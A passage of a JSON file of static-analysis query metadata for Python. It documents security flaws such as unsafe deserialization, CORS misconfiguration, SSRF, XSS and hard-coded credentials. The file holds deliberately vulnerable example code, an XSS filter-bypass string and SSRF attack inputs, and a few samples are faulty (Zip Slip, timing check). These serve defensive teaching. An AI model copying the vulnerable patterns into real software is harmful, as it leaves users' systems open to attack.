exec(\"setname('%s')\" % first_name)\n\ndef code_execution(request):\n    if request.method == 'POST':\n        first_name = base64.decodestring(request.POST.get('first_name', ''))\n        #GOOD --Call code directly\n        setname(first_name)\n\n```\n\n## References\n* OWASP: [Code Injection](https://www.owasp.org/index.php/Code_Injection).\n* Wikipedia: [Code Injection](https://en.wikipedia.org/wiki/Code_injection).\n* Common Weakness Enumeration: [CWE-94](https://cwe.mitre.org/data/definitions/94.html).\n* Common Weakness Enumeration: [CWE-95](https://cwe.mitre.org/data/definitions/95.html).\n* Common Weakness Enumeration: [CWE-116](https://cwe.mitre.org/data/definitions/116.html).\n"
  },
  "py/unsafe-deserialization": {
    "name": "Deserialization of user-controlled data",
    "description": "Deserializing user-controlled data may allow attackers to execute arbitrary code.",
    "kind": "path-problem",
    "id": "py/unsafe-deserialization",
    "problem.severity": "error",
    "security-severity": 9.8,
    "sub-severity": "high",
    "precision": "high",
    "tags": [
      "external/cwe/cwe-502",
      "security",
      "serialization"
    ],
    "filename": "d74ea1db-UnsafeDeserialization",
    "language": "python",
    "help": "# Deserialization of user-controlled data\nDeserializing untrusted data using any deserialization framework that allows the construction of arbitrary serializable objects is easily exploitable and in many cases allows an attacker to execute arbitrary code. Even before a deserialized object is returned to the caller of a deserialization method a lot of code may have been executed, including static initializers, constructors, and finalizers. Automatic deserialization of fields means that an attacker may craft a nested combination of objects on which the executed initialization code may have unforeseen effects, such as the execution of arbitrary code.\n\nThere are many different serialization frameworks. This query currently supports Pickle, Marshal and Yaml.\n\n\n## Recommendation\nAvoid deserialization of untrusted data if at all possible. If the architecture permits it then use other formats instead of serialized objects, for example JSON.\n\nIf you need to use YAML, use the `yaml.safe_load` function.\n\n\n## Example\nThe following example calls `pickle.loads` directly on a value provided by an incoming HTTP request. Pickle then creates a new value from untrusted data, and is therefore inherently unsafe.\n\n\n```python\n\nfrom django.conf.urls import url\nimport pickle\n\ndef unsafe(pickled):\n    return pickle.loads(pickled)\n\nurlpatterns = [\n    url(r'^(?P<object>.*)$', unsafe)\n]\n```\nChanging the code to use `json.loads` instead of `pickle.loads` removes the vulnerability.\n\n\n```python\n\nfrom django.conf.urls import url\nimport json\n\ndef safe(pickled):\n    return json.loads(pickled)\n\nurlpatterns = [\n    url(r'^(?P<object>.*)$', safe)\n]\n\n```\n\n## References\n* OWASP vulnerability description: [Deserialization of untrusted data](https://www.owasp.org/index.php/Deserialization_of_untrusted_data).\n* OWASP guidance on deserializing objects: [Deserialization Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html).\n* Talks by Chris Frohoff &amp; Gabriel Lawrence: [ AppSecCali 2015: Marshalling Pickles - how deserializing objects will ruin your day](http://frohoff.github.io/appseccali-marshalling-pickles/)\n* Common Weakness Enumeration: [CWE-502](https://cwe.mitre.org/data/definitions/502.html).\n"
  },
  "py/cors-misconfiguration-with-credentials": {
    "name": "Cors misconfiguration with credentials",
    "description": "Disabling or weakening SOP protection may make the application vulnerable to a CORS attack.",
    "kind": "problem",
    "problem.severity": "warning",
    "security-severity": 8.8,
    "precision": "high",
    "id": "py/cors-misconfiguration-with-credentials",
    "tags": [
      "security",
      "experimental",
      "external/cwe/cwe-942"
    ],
    "filename": "ebbb8149-CorsMisconfigurationMiddleware",
    "language": "python",
    "help": "# Cors misconfiguration with credentials\nWeb browsers, by default, disallow cross-origin resource sharing via direct HTTP requests. Still, to satisfy some needs that arose with the growth of the web, an expedient was created to make exceptions possible. CORS (Cross-origin resource sharing) is a mechanism that allows resources of a web endpoint (let's call it \"Peer A\") to be accessed from another web page belonging to a different domain (\"Peer B\").\n\nFor that to happen, Peer A needs to make available its CORS configuration via special headers on the desired endpoint via the OPTIONS method.\n\nThis configuration can also allow the inclusion of cookies on the cross-origin request, (i.e. when the `Access-Control-Allow-Credentials` header is set to true) meaning that Peer B can send a request to Peer A that will include the cookies as if the request was executed by the user.\n\nThat can have dangerous effects if the origin of Peer B is not restricted correctly. An example of a dangerous scenario is when `Access-Control-Allow-Origin` header is set to a value obtained from the request made by Peer B (and not correctly validated), or is set to special values such as `*` or `null`. The above values can allow any Peer B to send requests to the misconfigured Peer A on behalf of the user.\n\nExample scenario: User is client of a bank that has its API misconfigured to accept CORS requests from any domain. When the user loads an evil page, the evil page sends a request to the bank's API to transfer all funds to evil party's account. Given that the user was already logged in to the bank website, and had its session cookies set, the evil party's request succeeds.\n\n\n## Recommendation\nWhen configuring CORS that allow credentials passing, it's best not to use user-provided values for the allowed origins response header, especially if the cookies grant session permissions on the user's account.\n\nIt also can be very dangerous to set the allowed origins to `null` (which can be bypassed).\n\n\n## Example\nThe first example shows a possible CORS misconfiguration case:\n\n\n```python\nfrom fastapi import FastAPI\nfrom fastapi.middleware.cors import CORSMiddleware\n\napp = FastAPI()\n\norigins = [\n    \"*\"\n]\n\napp.add_middleware(\n    CORSMiddleware,\n    allow_origins=origins,\n    allow_credentials=True,\n    allow_methods=[\"*\"],\n    allow_headers=[\"*\"],\n)\n\n\n@app.get(\"/\")\nasync def main():\n    return {\"message\": \"Hello World\"}\n```\nThe second example shows a better configuration:\n\n\n```python\nfrom fastapi import FastAPI\nfrom fastapi.middleware.cors import CORSMiddleware\n\napp = FastAPI()\n\norigins = [\n    \"http://localhost.tiangolo.com\",\n    \"https://localhost.tiangolo.com\",\n    \"http://localhost\",\n    \"http://localhost:8080\",\n]\n\napp.add_middleware(\n    CORSMiddleware,\n    allow_origins=origins,\n    allow_credentials=True,\n    allow_methods=[\"*\"],\n    allow_headers=[\"*\"],\n)\n\n\n@app.get(\"/\")\nasync def main():\n    return {\"message\": \"Hello World\"}\n```\n\n## References\n* Reference 1: [PortSwigger Web Security Academy on CORS](https://portswigger.net/web-security/cors).\n* Reference 2: [AppSec EU 2017 Exploiting CORS Misconfigurations For Bitcoins And Bounties by James Kettle](https://www.youtube.com/watch?v=wgkj4ZgxI4c).\n* Common Weakness Enumeration: [CWE-942](https://cwe.mitre.org/data/definitions/942.html).\n"
  },
  "py/unicode-dos": {
    "name": "Denial of Service using Unicode Characters",
    "description": "A remote user-controlled data can reach a costly Unicode normalization with either form NFKC or NFKD. On Windows OS, with an attack such as the One Million Unicode Characters, this could lead to a denial of service. And, with the use of special Unicode characters, like U+2100 (\u2100) or U+2105 (\u2105), the payload size could be tripled.",
    "kind": "path-problem",
    "id": "py/unicode-dos",
    "precision": "high",
    "problem.severity": "error",
    "tags": [
      "security",
      "experimental",
      "external/cwe/cwe-770"
    ],
    "filename": "78c0f0b2-UnicodeDoS",
    "language": "python",
    "help": "# Denial of Service using Unicode Characters\nWhen a remote user-controlled data can reach a costly Unicode normalization with either form, NFKC or NFKD, an attack such as the One Million Unicode Characters, could lead to a denial of service on Windows OS.\n\nAnd, with the use of special Unicode characters, like U+2100 (\u2100) or U+2105 (\u2105), the payload size could be tripled after the compatibility normalization.\n\n\n## Recommendation\nEnsure limiting the size of any incoming data that would go through a costly operations, including a Windows Unicode normalization with NFKC or NFKD. Such a recommandation would avoid a potential denial of service.\n\n\n## Example\nIn this example a simple user-controlled data reaches a Unicode normalization with the form \"NFKC\".\n\n\n```python\nfrom flask import Flask, jsonify, request\nimport unicodedata\n\napp = Flask(__name__)\n\n\n@app.route(\"/bad_1\")\ndef bad_1():\n    # User controlled data\n    file_path = request.args.get(\"file_path\", \"\")\n\n    # Normalize the file path using NFKC Unicode normalization\n    return (\n        unicodedata.normalize(\"NFKC\", file_path),\n        200,\n        {\"Content-Type\": \"application/octet-stream\"},\n    )\n\n```\nTo fix this vulnerability, we need restrain the size of the user input.\n\nFor example, we can use the `len()` builtin function to limit the size of the user input.\n\n\n```python\nfrom flask import Flask, jsonify, request\nimport unicodedata\n\napp = Flask(__name__)\n\n\n@app.route(\"/good_1\")\ndef good_1():\n    r = request.args.get(\"file_path\", \"\")\n\n    if len(r) <= 1_000:\n        # Normalize the r using NFKD Unicode normalization\n        r = unicodedata.normalize(\"NFKD\", r)\n        return r, 200, {\"Content-Type\": \"application/octet-stream\"}\n    else:\n        return jsonify({\"error\": \"File not found\"}), 404\n\n```\n\n## References\n* [CVE-2023-46695: Potential denial of service vulnerability in Django UsernameField on Windows.](https://hackerone.com/reports/2258758)\n* Common Weakness Enumeration: [CWE-770](https://cwe.mitre.org/data/definitions/770.html).\n"
  },
  "py/weak-sensitive-data-hashing": {
    "name": "Use of a broken or weak cryptographic hashing algorithm on sensitive data",
    "description": "Using broken or weak cryptographic hashing algorithms can compromise security.",
    "kind": "path-problem",
    "problem.severity": "warning",
    "security-severity": 7.5,
    "precision": "high",
    "id": "py/weak-sensitive-data-hashing",
    "tags": [
      "security",
      "external/cwe/cwe-327",
      "external/cwe/cwe-328",
      "external/cwe/cwe-916"
    ],
    "filename": "c6fd54e6-WeakSensitiveDataHashing",
    "language": "python",
    "help": "# Use of a broken or weak cryptographic hashing algorithm on sensitive data\nUsing a broken or weak cryptographic hash function can leave data vulnerable, and should not be used in security related code.\n\nA strong cryptographic hash function should be resistant to:\n\n* pre-image attacks: if you know a hash value `h(x)`, you should not be able to easily find the input `x`.\n* collision attacks: if you know a hash value `h(x)`, you should not be able to easily find a different input `y` with the same hash value `h(x) = h(y)`.\nIn cases with a limited input space, such as for passwords, the hash function also needs to be computationally expensive to be resistant to brute-force attacks. Passwords should also have an unique salt applied before hashing, but that is not considered by this query.\n\nAs an example, both MD5 and SHA-1 are known to be vulnerable to collision attacks.\n\nSince it's OK to use a weak cryptographic hash function in a non-security context, this query only alerts when these are used to hash sensitive data (such as passwords, certificates, usernames).\n\nUse of broken or weak cryptographic algorithms that are not hashing algorithms, is handled by the `py/weak-cryptographic-algorithm` query.\n\n\n## Recommendation\nEnsure that you use a strong, modern cryptographic hash function:\n\n* such as Argon2, scrypt, bcrypt, or PBKDF2 for passwords and other data with limited input space.\n* such as SHA-2, or SHA-3 in other cases.\n\n## Example\nThe following example shows two functions for checking whether the hash of a certificate matches a known value -- to prevent tampering. The first function uses MD5 that is known to be vulnerable to collision attacks. The second function uses SHA-256 that is a strong cryptographic hashing function.\n\n\n```python\nimport hashlib\n\ndef certificate_matches_known_hash_bad(certificate, known_hash):\n    hash = hashlib.md5(certificate).hexdigest() # BAD\n    return hash == known_hash\n\ndef certificate_matches_known_hash_good(certificate, known_hash):\n    hash = hashlib.sha256(certificate).hexdigest() # GOOD\n    return hash == known_hash\n\n```\n\n## Example\nThe following example shows two functions for hashing passwords. The first function uses SHA-256 to hash passwords. Although SHA-256 is a strong cryptographic hash function, it is not suitable for password hashing since it is not computationally expensive.\n\n\n```python\nimport hashlib\n\ndef get_password_hash(password: str, salt: str):\n    return hashlib.sha256(password + salt).hexdigest() # BAD\n\n```\nThe second function uses Argon2 (through the `argon2-cffi` PyPI package), which is a strong password hashing algorithm (and includes a per-password salt by default).\n\n\n```python\nfrom argon2 import PasswordHasher\n\ndef get_initial_hash(password: str):\n    ph = PasswordHasher()\n    return ph.hash(password) # GOOD\n\ndef check_password(password: str, known_hash):\n    ph = PasswordHasher()\n    return ph.verify(known_hash, password) # GOOD\n\n```\n\n## References\n* OWASP: [Password Storage Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html)\n* Common Weakness Enumeration: [CWE-327](https://cwe.mitre.org/data/definitions/327.html).\n* Common Weakness Enumeration: [CWE-328](https://cwe.mitre.org/data/definitions/328.html).\n* Common Weakness Enumeration: [CWE-916](https://cwe.mitre.org/data/definitions/916.html).\n"
  },
  "py/jinja2/autoescape-false": {
    "name": "Jinja2 templating with autoescape=False",
    "description": "Using jinja2 templates with 'autoescape=False' can cause a cross-site scripting vulnerability.",
    "kind": "problem",
    "problem.severity": "error",
    "security-severity": 6.1,
    "precision": "medium",
    "id": "py/jinja2/autoescape-false",
    "tags": [
      "security",
      "external/cwe/cwe-079"
    ],
    "filename": "3e123dc1-Jinja2WithoutEscaping",
    "language": "python",
    "help": "# Jinja2 templating with autoescape=False\nCross-site scripting (XSS) attacks can occur if untrusted input is not escaped. This applies to templates as well as code. The `jinja2` templates may be vulnerable to XSS if the environment has `autoescape` set to `False`. Unfortunately, `jinja2` sets `autoescape` to `False` by default. Explicitly setting `autoescape` to `True` when creating an `Environment` object will prevent this.\n\n\n## Recommendation\nAvoid setting jinja2 autoescape to False. Jinja2 provides the function `select_autoescape` to make sure that the correct auto-escaping is chosen. For example, it can be used when creating an environment `Environment(autoescape=select_autoescape(['html', 'xml'])`\n\n\n## Example\nThe following example is a minimal Flask app which shows a safe and an unsafe way to render the given name back to the page. The first view is unsafe as `first_name` is not escaped, leaving the page vulnerable to cross-site scripting attacks. The second view is safe as `first_name` is escaped, so it is not vulnerable to cross-site scripting attacks.\n\n\n```python\nfrom flask import Flask, request, make_response, escape\nfrom jinja2 import Environment, select_autoescape, FileSystemLoader\n\napp = Flask(__name__)\nloader = FileSystemLoader( searchpath=\"templates/\" )\n\nunsafe_env = Environment(loader=loader)\nsafe1_env = Environment(loader=loader, autoescape=True)\nsafe2_env = Environment(loader=loader, autoescape=select_autoescape())\n\ndef render_response_from_env(env):\n    name = request.args.get('name', '')\n    template = env.get_template('template.html')\n    return make_response(template.render(name=name))\n\n@app.route('/unsafe')\ndef unsafe():\n    return render_response_from_env(unsafe_env)\n\n@app.route('/safe1')\ndef safe1():\n    return render_response_from_env(safe1_env)\n\n@app.route('/safe2')\ndef safe2():\n    return render_response_from_env(safe2_env)\n\n\n```\n\n## References\n* Jinja2: [API](http://jinja.pocoo.org/docs/2.10/api/).\n* Wikipedia: [Cross-site scripting](http://en.wikipedia.org/wiki/Cross-site_scripting).\n* OWASP: [XSS (Cross Site Scripting) Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html).\n* Common Weakness Enumeration: [CWE-79](https://cwe.mitre.org/data/definitions/79.html).\n"
  },
  "py/timing-attack-against-header-value": {
    "name": "Timing attack against header value",
    "description": "Use of a non-constant-time verification routine to check the value of an HTTP header, possibly allowing a timing attack to infer the header's expected value.",
    "kind": "path-problem",
    "problem.severity": "error",
    "precision": "high",
    "id": "py/timing-attack-against-header-value",
    "tags": [
      "security",
      "external/cwe/cwe-208",
      "experimental"
    ],
    "filename": "56abb2a3-TimingAttackAgainstHeaderValue",
    "language": "python",
    "help": "# Timing attack against header value\nA constant-time algorithm should be used for checking the value of sensitive headers. In other words, the comparison time should not depend on the content of the input. Otherwise timing information could be used to infer the header's expected, secret value.\n\n\n## Recommendation\nTwo types of countermeasures can be applied against timing attacks. The first one consists in eliminating timing variations whereas the second renders these variations useless for an attacker. The only absolute way to prevent timing attacks is to make the computation strictly constant time, independent of the input. Use `hmac.compare_digest()` method to securely check the secret value. If this method is used, then the calculation time depends only on the length of input byte arrays, and does not depend on the contents of the arrays. Unlike `==` is a fail fast check, If the first byte is not equal, it will return immediately.\n\n\n## Example\nThe following example uses `==` which is a fail fast check for validating the value of sensitive headers.\n\n\n```python\n#!/usr/bin/env python\n# -*- coding: UTF-8 -*-\n\n\"\"\"\n@Desc   \uff1apreventing timing attack against header value\n\"\"\"\n\nfrom flask import Flask\nfrom flask import request\n\n@app.route('/bad')\ndef bad():\n    secret = request.headers.get('X-Auth-Token')    \n    if secret == \"token\":\n        raise Exception('bad token')\n    return 'bad'\n\nif __name__ == '__main__':\n    app.debug = True\n    app.run() \n\n```\nThe next example use a safe constant-time algorithm for validating the value of sensitive headers:\n\n\n```python\n#!/usr/bin/env python\n# -*- coding: UTF-8 -*-\n\n\"\"\"\n@Desc   \uff1apreventing timing attack against header value\n\"\"\"\n\nfrom flask import Flask\nfrom flask import request\nimport hmac\n\n@app.route('/good')\ndef good():\n    secret = request.headers.get('X-Auth-Token')    \n    if not hmac.compare_digest(secret, \"token\"):\n        raise Exception('bad token')\n    return 'good'\n\nif __name__ == '__main__':\n    app.debug = True\n    app.run() \n\n```\n\n## References\n* Wikipedia: [Timing attack](https://en.wikipedia.org/wiki/Timing_attack).\n* [hmac.compare_digest() method](https://docs.python.org/3/library/hmac.html#hmac.compare_digest)\n* Common Weakness Enumeration: [CWE-208](https://cwe.mitre.org/data/definitions/208.html).\n"
  },
  "py/clear-text-storage-sensitive-data": {
    "name": "Clear-text storage of sensitive information",
    "description": "Sensitive information stored without encryption or hashing can expose it to an attacker.",
    "kind": "path-problem",
    "problem.severity": "error",
    "security-severity": 7.5,
    "precision": "high",
    "id": "py/clear-text-storage-sensitive-data",
    "tags": [
      "security",
      "external/cwe/cwe-312",
      "external/cwe/cwe-315",
      "external/cwe/cwe-359"
    ],
    "filename": "fafb68f4-CleartextStorage",
    "language": "python",
    "help": "# Clear-text storage of sensitive information\nSensitive information that is stored unencrypted is accessible to an attacker who gains access to the storage. This is particularly important for cookies, which are stored on the machine of the end-user.\n\n\n## Recommendation\nEnsure that sensitive information is always encrypted before being stored. If possible, avoid placing sensitive information in cookies altogether. Instead, prefer storing, in the cookie, a key that can be used to look up the sensitive information.\n\nIn general, decrypt sensitive information only at the point where it is necessary for it to be used in cleartext.\n\nBe aware that external processes often store the `standard out` and `standard error` streams of the application, causing logged sensitive information to be stored as well.\n\n\n## Example\nThe following example code stores user credentials (in this case, their password) in a cookie in plain text:\n\n\n```python\nfrom flask import Flask, make_response, request\n\napp = Flask(\"Leak password\")\n\n@app.route('/')\ndef index():\n    password = request.args.get(\"password\")\n    resp = make_response(render_template(...))\n    resp.set_cookie(\"password\", password)\n    return resp\n\n```\nInstead, the credentials should be encrypted, for instance by using the `cryptography` module, or not stored at all.\n\n\n## References\n* M. Dowd, J. McDonald and J. Schuhm, *The Art of Software Security Assessment*, 1st Edition, Chapter 2 - 'Common Vulnerabilities of Encryption', p. 43. Addison Wesley, 2006.\n* M. Howard and D. LeBlanc, *Writing Secure Code*, 2nd Edition, Chapter 9 - 'Protecting Secret Data', p. 299. Microsoft, 2002.\n* Common Weakness Enumeration: [CWE-312](https://cwe.mitre.org/data/definitions/312.html).\n* Common Weakness Enumeration: [CWE-315](https://cwe.mitre.org/data/definitions/315.html).\n* Common Weakness Enumeration: [CWE-359](https://cwe.mitre.org/data/definitions/359.html).\n"
  },
  "py/bad-tag-filter": {
    "name": "Bad HTML filtering regexp",
    "description": "Matching HTML tags using regular expressions is hard to do right, and can easily lead to security issues.",
    "kind": "problem",
    "problem.severity": "warning",
    "security-severity": 7.8,
    "precision": "high",
    "id": "py/bad-tag-filter",
    "tags": [
      "correctness",
      "security",
      "external/cwe/cwe-116",
      "external/cwe/cwe-020",
      "external/cwe/cwe-185",
      "external/cwe/cwe-186"
    ],
    "filename": "f2153fa1-BadTagFilter",
    "language": "python",
    "help": "# Bad HTML filtering regexp\nIt is possible to match some single HTML tags using regular expressions (parsing general HTML using regular expressions is impossible). However, if the regular expression is not written well it might be possible to circumvent it, which can lead to cross-site scripting or other security issues.\n\nSome of these mistakes are caused by browsers having very forgiving HTML parsers, and will often render invalid HTML containing syntax errors. Regular expressions that attempt to match HTML should also recognize tags containing such syntax errors.\n\n\n## Recommendation\nUse a well-tested sanitization or parser library if at all possible. These libraries are much more likely to handle corner cases correctly than a custom implementation.\n\n\n## Example\nThe following example attempts to filters out all `<script>` tags.\n\n\n```python\nimport re\n\ndef filterScriptTags(content): \n    oldContent = \"\"\n    while oldContent != content:\n        oldContent = content\n        content = re.sub(r'<script.*?>.*?</script>', '', content, flags= re.DOTALL | re.IGNORECASE)\n    return content\n```\nThe above sanitizer does not filter out all `<script>` tags. Browsers will not only accept `</script>` as script end tags, but also tags such as `</script foo=\"bar\">` even though it is a parser error. This means that an attack string such as `<script>alert(1)</script foo=\"bar\">` will not be filtered by the function, and `alert(1)` will be executed by a browser if the string is rendered as HTML.\n\nOther corner cases include that HTML comments can end with `--!>`, and that HTML tag names can contain upper case characters.\n\n\n## References\n* Securitum: [The Curious Case of Copy &amp; Paste](https://research.securitum.com/the-curious-case-of-copy-paste/).\n* stackoverflow.com: [You can't parse \\[X\\]HTML with regex](https://stackoverflow.com/questions/1732348/regex-match-open-tags-except-xhtml-self-contained-tags#answer-1732454).\n* HTML Standard: [Comment end bang state](https://html.spec.whatwg.org/multipage/parsing.html#comment-end-bang-state).\n* stackoverflow.com: [Why aren't browsers strict about HTML?](https://stackoverflow.com/questions/25559999/why-arent-browsers-strict-about-html).\n* Common Weakness Enumeration: [CWE-116](https://cwe.mitre.org/data/definitions/116.html).\n* Common Weakness Enumeration: [CWE-20](https://cwe.mitre.org/data/definitions/20.html).\n* Common Weakness Enumeration: [CWE-185](https://cwe.mitre.org/data/definitions/185.html).\n* Common Weakness Enumeration: [CWE-186](https://cwe.mitre.org/data/definitions/186.html).\n"
  },
  "py/hardcoded-credentials": {
    "name": "Hard-coded credentials",
    "description": "Credentials are hard coded in the source code of the application.",
    "kind": "path-problem",
    "problem.severity": "error",
    "security-severity": 9.8,
    "precision": "medium",
    "id": "py/hardcoded-credentials",
    "tags": [
      "security",
      "external/cwe/cwe-259",
      "external/cwe/cwe-321",
      "external/cwe/cwe-798"
    ],
    "filename": "e1bbd7f0-HardcodedCredentials",
    "language": "python",
    "help": "# Hard-coded credentials\nIncluding unencrypted hard-coded inbound or outbound authentication credentials within source code or configuration files is dangerous because the credentials may be easily discovered.\n\nSource or configuration files containing hard-coded credentials may be visible to an attacker. For example, the source code may be open source, or it may be leaked or accidentally revealed.\n\nFor inbound authentication, hard-coded credentials may allow unauthorized access to the system. This is particularly problematic if the credential is hard-coded in the source code, because it cannot be disabled easily. For outbound authentication, the hard-coded credentials may provide an attacker with privileged information or unauthorized access to some other system.\n\n\n## Recommendation\nRemove hard-coded credentials, such as user names, passwords and certificates, from source code, placing them in configuration files or other data stores if necessary. If possible, store configuration files including credential data separately from the source code, in a secure location with restricted access.\n\nFor outbound authentication details, consider encrypting the credentials or the enclosing data stores or configuration files, and using permissions to restrict access.\n\nFor inbound authentication details, consider hashing passwords using standard library functions where possible. For example, `hashlib.pbkdf2_hmac`.\n\n\n## Example\nThe following examples shows different types of inbound and outbound authentication.\n\nIn the first case, we accept a password from a remote user, and compare it against a plaintext string literal. If an attacker acquires the source code they can observe the password, and can log in to the system. Furthermore, if such an intrusion was discovered, the application would need to be rewritten and redeployed in order to change the password.\n\nIn the second case, the password is compared to a hashed and salted password stored in a configuration file, using `hashlib.pbkdf2_hmac`. In this case, access to the source code or the assembly would not reveal the password to an attacker. Even access to the configuration file containing the password hash and salt would be of little value to an attacker, as it is usually extremely difficult to reverse engineer the password from the hash and salt.\n\nIn the final case, a password is changed to a new, hard-coded value. If an attacker has access to the source code, they will be able to observe the new password.\n\n\n```python\nimport hashlib\nimport binascii\n\ndef process_request(request):\n    password = request.GET[\"password\"]\n\n    # BAD: Inbound authentication made by comparison to string literal\n    if password == \"myPa55word\":\n        redirect(\"login\")\n\n    hashed_password = load_from_config('hashed_password', CONFIG_FILE)\n    salt = load_from_config('salt', CONFIG_FILE)\n\n    #GOOD: Inbound authentication made by comparing to a hash password from a config file.\n    dk = hashlib.pbkdf2_hmac('sha256', password, salt, 100000)\n    hashed_input = binascii.hexlify(dk)\n    if hashed_input == hashed_password:\n        redirect(\"login\")\n\n\n```\n\n## References\n* OWASP: [XSS Use of hard-coded password](https://www.owasp.org/index.php/Use_of_hard-coded_password).\n* Common Weakness Enumeration: [CWE-259](https://cwe.mitre.org/data/definitions/259.html).\n* Common Weakness Enumeration: [CWE-321](https://cwe.mitre.org/data/definitions/321.html).\n* Common Weakness Enumeration: [CWE-798](https://cwe.mitre.org/data/definitions/798.html).\n"
  },
  "py/full-ssrf": {
    "name": "Full server-side request forgery",
    "description": "Making a network request to a URL that is fully user-controlled allows for request forgery attacks.",
    "kind": "path-problem",
    "problem.severity": "error",
    "security-severity": 9.1,
    "precision": "high",
    "id": "py/full-ssrf",
    "tags": [
      "security",
      "external/cwe/cwe-918"
    ],
    "filename": "e3a6333f-FullServerSideRequestForgery",
    "language": "python",
    "help": "# Full server-side request forgery\nDirectly incorporating user input into an HTTP request without validating the input can facilitate server-side request forgery (SSRF) attacks. In these attacks, the request may be changed, directed at a different server, or via a different protocol. This can allow the attacker to obtain sensitive information or perform actions with escalated privilege.\n\nWe make a distinctions between how much of the URL an attacker can control:\n\n* **Full SSRF**: where the full URL can be controlled.\n* **Partial SSRF**: where only part of the URL can be controlled, such as the path component of a URL to a hardcoded domain.\n\n\nPartial control of a URL is often much harder to exploit. Therefore we have created a separate query for each of these.\n\nThis query covers full SSRF, to find partial SSRF use the `py/partial-ssrf` query.\n\n\n## Recommendation\nTo guard against SSRF attacks you should avoid putting user-provided input directly into a request URL. Instead, either maintain a list of authorized URLs on the server and choose from that list based on the input provided, or perform proper validation of the input.\n\n\n## Example\nThe following example shows code vulnerable to a full SSRF attack, because it uses untrusted input (HTTP request parameter) directly to construct a URL. By using `evil.com#` as the `target` value, the requested URL will be `https://evil.com#.example.com/data/`. It also shows how to remedy the problem by using the user input select a known fixed string.\n\n\n```python\nimport requests\nfrom flask import Flask, request\n\napp = Flask(__name__)\n\n@app.route(\"/full_ssrf\")\ndef full_ssrf():\n    target = request.args[\"target\"]\n\n    # BAD: user has full control of URL\n    resp = requests.get(\"https://\" + target + \".example.com/data/\")\n\n    # GOOD: `subdomain` is controlled by the server.\n    subdomain = \"europe\" if target == \"EU\" else \"world\"\n    resp = requests.get(\"https://\" + subdomain + \".example.com/data/\")\n\n```\n\n## Example\nThe following example shows code vulnerable to a partial SSRF attack, because it uses untrusted input (HTTP request parameter) directly to construct a URL. By using `../transfer-funds-to/123?amount=456` as the `user_id` value, the requested URL will be `https://api.example.com/transfer-funds-to/123?amount=456`. It also shows how to remedy the problem by validating the input.\n\n\n```python\nimport requests\nfrom flask import Flask, request\n\napp = Flask(__name__)\n\n@app.route(\"/partial_ssrf\")\ndef partial_ssrf():\n    user_id = request.args[\"user_id\"]\n\n    # BAD: user can fully control the path component of the URL\n    resp = requests.get(\"https://api.example.com/user_info/\" + user_id)\n\n    if user_id.isalnum():\n        # GOOD: user_id is restricted to be alpha-numeric, and cannot alter path component of URL\n        resp = requests.get(\"https://api.example.com/user_info/\" + user_id)\n\n```\n\n## References\n* [OWASP SSRF article](https://owasp.org/www-community/attacks/Server_Side_Request_Forgery)\n* [PortSwigger SSRF article](https://portswigger.net/web-security/ssrf)\n* Common Weakness Enumeration: [CWE-918](https://cwe.mitre.org/data/definitions/918.html).\n"
  },
  "py/zipslip": {
    "name": "Arbitrary file access during archive extraction (\"Zip Slip\")",
    "description": "Extracting files from a malicious ZIP file, or similar type of archive, without validating that the destination file path is within the destination directory can allow an attacker to unexpectedly gain access to resources.",
    "kind": "path-problem",
    "id": "py/zipslip",
    "problem.severity": "error",
    "security-severity": 7.5,
    "precision": "high",
    "tags": [
      "security",
      "experimental",
      "external/cwe/cwe-022"
    ],
    "filename": "02592832-ZipSlip",
    "language": "python",
    "help": "# Arbitrary file access during archive extraction (\"Zip Slip\")\nExtracting files from a malicious zip file, or similar type of archive, is at risk of directory traversal attacks if filenames from the archive are not properly validated.\n\nZip archives contain archive entries representing each file in the archive. These entries include a file path for the entry, but these file paths are not restricted and may contain unexpected special elements such as the directory traversal element (`..`). If these file paths are used to create a filesystem path, then a file operation may happen in an unexpected location. This can result in sensitive information being revealed or deleted, or an attacker being able to influence behavior by modifying unexpected files.\n\nFor example, if a Zip archive contains a file entry `..\\sneaky-file`, and the Zip archive is extracted to the directory `c:\\output`, then naively combining the paths would result in an output file path of `c:\\output\\..\\sneaky-file`, which would cause the file to be written to `c:\\sneaky-file`.\n\n\n## Recommendation\nEnsure that output paths constructed from Zip archive entries are validated to prevent writing files to unexpected locations.\n\nThe recommended way of writing an output file from a Zip archive entry is to call `extract()` or `extractall()`.\n\n\n## Example\nIn this example an archive is extracted without validating file paths.\n\n\n```python\nimport zipfile\nimport shutil\n\ndef unzip(filename):\n    with tarfile.open(filename) as zipf:\n    #BAD : This could write any file on the filesystem.\n        for entry in zipf:\n            shutil.copyfile(entry, \"/tmp/unpack/\")\n          \ndef unzip4(filename):\n    zf = zipfile.ZipFile(filename)\n    filelist = zf.namelist()\n    for x in filelist:\n        with zf.open(x) as srcf:\n            shutil.copyfileobj(srcf, dstfile)\n\n\n```\nTo fix this vulnerability, we need to call the function `extractall()`.\n\n\n```python\nimport zipfile \n\ndef unzip(filename, dir):\n    zf = zipfile.ZipFile(filename)\n    zf.extractall(dir)\n    \n\ndef unzip1(filename, dir):\n    zf = zipfile.ZipFile(filename)\n    zf.extract(dir)\n\n```\n\n## References\n* Snyk: [Zip Slip Vulnerability](https://snyk.io/research/zip-slip-vulnerability).\n* Common Weakness Enumeration: [CWE-22](https://cwe.mitre.org/data/definitions/22.html).\n"
  },
  "py/polynomial-redos": {
    "name": "Polynomial regular expression used on uncontrolled data",
    "description": "A regular expression that can require polynomial time to match may be vulnerable to denial-of-service attacks.",
    "kind": "path-problem",
    "problem.severity": "warning",
    "security-severity": 7.5,
    "precision": "high",
    "id": "py/polynomial-redos",
    "tags": [
      "security",
      "external/cwe/cwe-1333",
      "external/cwe/cwe-730",
      "external/cwe/cwe-400"
    ],
    "filename": "19a7ad06-PolynomialReDoS",
    "language": "python",
